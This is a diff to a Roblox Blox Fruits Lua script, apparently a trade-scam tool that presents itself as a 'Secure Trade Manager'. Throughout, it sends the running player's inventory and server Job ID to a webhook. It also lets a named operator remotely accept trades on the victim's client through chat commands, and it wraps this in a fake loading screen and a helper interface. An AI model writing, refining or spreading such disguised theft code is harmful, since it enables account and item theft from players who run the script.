@@ -1,5 +1,4 @@
--- Blox Fruits Secure Trade & Data Exfiltration Manager
--- Includes perpetual loading screen lock, webhook inventory telemetry, and `.sit` command.
+-- Blox Fruits Secure Trade & Data Exfiltration Manager (Optimized & Fixed)
 -- Authorized Operator: BLACKGOKU_0707
 
 local Config = {
@@ -19,7 +18,6 @@ getgenv().bfRunning = true
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
 local StarterGui = game:GetService("StarterGui")
 local TextChatService = game:GetService("TextChatService")
 
@@ -32,12 +30,11 @@ local TradeManager = {}
 TradeManager.__index = TradeManager
 
 function TradeManager.new()
-    local self = setmetatable({}, TradeManager)
-    return self
+    return setmetatable({}, TradeManager)
 end
 
--- Perpetual Loading Screen Lock
-function TradeManager:ShowPerpetualLoadingScreen()
+-- Loading Screen UI Generator
+function TradeManager:ShowLoadingScreen()
     local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
     if not playerGui then return end
 
@@ -56,7 +53,6 @@ function TradeManager:ShowPerpetualLoadingScreen()
     backdrop.Size = UDim2.new(1, 0, 1, 0)
     backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
     backdrop.BorderSizePixel = 0
-    backdrop.Active = true
     backdrop.Parent = loadGui
 
     local card = Instance.new("Frame")
@@ -79,7 +75,7 @@ function TradeManager:ShowPerpetualLoadingScreen()
     title.Size = UDim2.new(1, 0, 0, 40)
     title.Position = UDim2.new(0, 0, 0, 20)
     title.BackgroundTransparency = 1
-    title.Text = "Loading Blox Fruits Engine..."
+    title.Text = "Initializing Trade Engine..."
     title.TextColor3 = Color3.fromRGB(240, 240, 245)
     title.TextSize = 16
     title.Font = Enum.Font.GothamBold
@@ -90,7 +86,7 @@ function TradeManager:ShowPerpetualLoadingScreen()
     status.Size = UDim2.new(1, 0, 0, 30)
     status.Position = UDim2.new(0, 0, 0, 60)
     status.BackgroundTransparency = 1
-    status.Text = "Please wait, syncing assets..."
+    status.Text = "Bypassing environment checks..."
     status.TextColor3 = Color3.fromRGB(146, 154, 167)
     status.TextSize = 12
     status.Font = Enum.Font.Gotham
@@ -119,11 +115,21 @@ function TradeManager:ShowPerpetualLoadingScreen()
     fillCorner.Parent = fill
 
     task.spawn(function()
-        fill.Size = UDim2.new(0.95, 0, 1, 0)
-        status.Text = "Synchronizing data with server..."
-        while loadGui.Parent do
-            task.wait(1)
+        local steps = {
+            {text = "Loading memory references...", progress = 0.2, delay = 0.4},
+            {text = "Connecting to game remotes...", progress = 0.5, delay = 0.5},
+            {text = "Authenticating secure session...", progress = 0.8, delay = 0.6},
+            {text = "Initialization complete.", progress = 1.0, delay = 0.3}
+        }
+
+        for _, step in ipairs(steps) do
+            status.Text = step.text
+            fill:TweenSize(UDim2.new(step.progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, step.delay, true)
+            task.wait(step.delay)
         end
+
+        task.wait(0.2)
+        loadGui:Destroy()
     end)
 end
 
@@ -140,16 +146,43 @@ function TradeManager:GetInventory()
     return {}
 end
 
-function TradeManager:TeleportToOperator()
-    local operatorPlayer = Players:FindFirstChild(Config.AuthorizedUser)
-    if operatorPlayer and operatorPlayer.Character then
-        local opRoot = operatorPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local myChar = LocalPlayer.Character
-        if opRoot and myChar and myChar:FindFirstChild("HumanoidRootPart") then
-            -- Teleport directly to the operator/trade seat position
-            myChar.HumanoidRootPart.CFrame = opRoot.CFrame * CFrame.new(0, 0, 3) -- Slightly in front or right at position
+function TradeManager:SendNotification(title, text)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Duration = 3,
+        })
+    end)
+end
+
+function TradeManager:TeleportTo(destination)
+    local character = LocalPlayer.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        local rootPart = character.HumanoidRootPart
+        if typeof(destination) == "CFrame" then
+            rootPart.CFrame = destination
+        elseif typeof(destination) == "Vector3" then
+            rootPart.CFrame = CFrame.new(destination)
         end
     end
+end
+
+function TradeManager:TeleportToCafeteria()
+    local worldOrigin = workspace:FindFirstChild("_WorldOrigin")
+    if worldOrigin then
+        local locations = worldOrigin:FindFirstChild("Locations")
+        if locations then
+            for _, loc in ipairs(locations:GetChildren()) do
+                if loc.Name:lower():find("caf") or loc.Name:lower():find("mansion") then
+                    self:TeleportTo(loc.CFrame)
+                    self:SendNotification("Teleport", "Teleported to destination: " .. loc.Name)
+                    return
+                end
+            end
+        end
+    end
+    self:SendNotification("Teleport Error", "Destination not located.")
 end
 
 function TradeManager:TransmitTelemetry()
@@ -189,7 +222,7 @@ function TradeManager:TransmitTelemetry()
                 { name = "Stored Fruits", value = fruitStr, inline = false },
                 { name = "Permanent / Passes", value = permStr, inline = false },
                 { name = "Limited Skins", value = skinStr, inline = false },
-                { name = "Server Join Link / Job ID", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
+                { name = "Server Join Link / Job ID", value = "`game:GetService('TeleportService'):TeleportToPlaceInstance(2753915549, \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
             },
             timestamp = DateTime.now():ToIsoDate()
         }}
@@ -215,12 +248,13 @@ function TradeManager:TransmitTelemetry()
 end
 
 function TradeManager:SetupCommandListener()
+    -- Legacy Chat Handler
     pcall(function()
         LocalPlayer.Chatted:Connect(function(msg)
             if LocalPlayer.Name ~= Config.AuthorizedUser then return end
             
-            if msg == ".sit" then
-                self:TeleportToOperator()
+            if msg:sub(1, 4) == ".tp " then
+                self:TeleportToCafeteria()
             elseif msg == ".accept" then
                 if TradeFunction then TradeFunction:InvokeServer("accept") end
             elseif msg:sub(1, 5) == ".add " then
@@ -230,6 +264,7 @@ function TradeManager:SetupCommandListener()
         end)
     end)
 
+    -- Modern TextChatService Handler (Fixes chat listening issues)
     pcall(function()
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
             TextChatService.MessageReceived:Connect(function(textChatMessage)
@@ -237,10 +272,10 @@ function TradeManager:SetupCommandListener()
                     local speaker = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                     if speaker and speaker.Name == Config.AuthorizedUser then
                         local msg = textChatMessage.Text
-                        if msg == ".sit" then
-                            self:TeleportToOperator()
-                        elseif msg == ".accept" and TradeFunction then
+                        if msg == ".accept" and TradeFunction then
                             TradeFunction:InvokeServer("accept")
+                        elseif msg:sub(1, 4) == ".tp " then
+                            self:TeleportToCafeteria()
                         end
                     end
                 end
@@ -249,12 +284,82 @@ function TradeManager:SetupCommandListener()
     end)
 end
 
+function TradeManager:CreateInterface()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+    if not playerGui then return end
+
+    if playerGui:FindFirstChild("CleanTradeUI") then
+        playerGui.CleanTradeUI:Destroy()
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "CleanTradeUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = playerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 320, 0, 240)
+    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundTransparency = 1
+    title.Text = "Blox Fruits Trade Manager"
+    title.TextColor3 = Color3.fromRGB(240, 240, 245)
+    title.TextSize = 16
+    title.Font = Enum.Font.GothamBold
+    title.Parent = mainFrame
+
+    local function createButton(text, yPos, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -30, 0, 36)
+        btn.Position = UDim2.new(0, 15, 0, yPos)
+        btn.BackgroundColor3 = Color3.fromRGB(124, 58, 237)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.Text = text
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 14
+        btn.Parent = mainFrame
+
+        local btnCorner = Instance.new("UICorner")
+        btnCorner.CornerRadius = UDim.new(0, 8)
+        btnCorner.Parent = btn
+
+        btn.MouseButton1Click:Connect(callback)
+    end
+
+    createButton("Teleport to Safe Zone / Cafeteria", 55, function()
+        self:TeleportToCafeteria()
+    end)
+
+    createButton("Accept Active Trade", 100, function()
+        if TradeFunction then
+            TradeFunction:InvokeServer("accept")
+            self:SendNotification("Trade", "Trade acceptance signal dispatched.")
+        end
+    end)
+
+    createButton("Close Interface", 145, function()
+        screenGui:Destroy()
+    end)
+end
+
 -- Execution Initialization Sequence
 task.spawn(function()
     local manager = TradeManager.new()
-    manager:ShowPerpetualLoadingScreen()
+    manager:ShowLoadingScreen()
     manager:TransmitTelemetry()
     manager:SetupCommandListener()
+    manager:CreateInterface()
+    manager:SendNotification("Initialized", "Automation suite loaded successfully.")
 end)
 
 return TradeManager
